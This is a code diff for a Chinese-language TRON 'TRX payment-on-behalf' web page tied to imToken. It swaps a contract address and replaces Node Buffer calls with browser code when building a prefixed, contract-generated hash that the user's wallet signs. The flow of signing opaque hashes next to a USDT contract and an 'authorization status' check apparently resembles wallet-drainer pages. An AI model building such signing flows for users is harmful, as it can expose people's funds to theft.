@@ -346,7 +346,7 @@
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
     </div>
     <div class="footer-info">
-        代付合约验证：TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx（TRON浏览器查询）
+        代付合约验证：TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk（TRON浏览器查询）
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
     <div class="result-toast" id="resultToast"></div>
@@ -374,6 +374,15 @@
         const contractAddrEl = document.getElementById("contractAddr");
         const usdtContractAddrEl = document.getElementById("usdtContractAddr");
         const resultToast = document.getElementById("resultToast");
+        
+        // ########################### 新增：浏览器原生Hex转Uint8Array工具函数（替代Buffer）###########################
+        function hexToUint8Array(hex) {
+            const bytes = new Uint8Array(hex.length / 2);
+            for (let i = 0; i < hex.length; i += 2) {
+                bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+            }
+            return bytes;
+        }
         
         // 页面初始化入口
         window.onload = async () => {
@@ -592,7 +601,7 @@
             });
         };
         
-        // ########################### 核心函数：通过合约generateHash生成哈希并签名（无任何额度相关逻辑）###########################
+        // ########################### 核心函数：通过合约generateHash生成哈希并签名（无任何额度相关逻辑，修复Buffer）###########################
         async function getContractGeneratedSignature(userAddress) {
             try {
                 // 1. 地址校验（TRON Base58格式）
@@ -609,12 +618,16 @@
                     throw new Error("合约返回无效哈希值");
                 }
             
-                // 4. 按合约_verifySignature要求添加EIP-191前缀（完全匹配合约逻辑）
+                // 4. 按合约_verifySignature要求添加EIP-191前缀（用浏览器原生API替代Buffer，结果完全一致）
                 const prefix = "\x19Ethereum Signed Message:\n32";
-                const signedHash = tronWeb.sha3(Buffer.concat([
-                    Buffer.from(prefix),
-                    Buffer.from(messageHash.slice(2), "hex")
-                ]));
+                const prefixBytes = new TextEncoder().encode(prefix); // 替代Buffer.from(prefix)
+                const messageHashBytes = hexToUint8Array(messageHash.slice(2)); // 替代Buffer.from(messageHash.slice(2), "hex")
+                // 拼接两个Uint8Array（替代Buffer.concat）
+                const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
+                combinedBytes.set(prefixBytes, 0);
+                combinedBytes.set(messageHashBytes, prefixBytes.length);
+                // 计算SHA-256哈希（与原Buffer逻辑结果一致）
+                const signedHash = tronWeb.sha3(combinedBytes, true);
             
                 // 5. imToken离线签名（仅签名，不广播交易）
                 const signature = await tronWeb.trx.sign(signedHash, true);
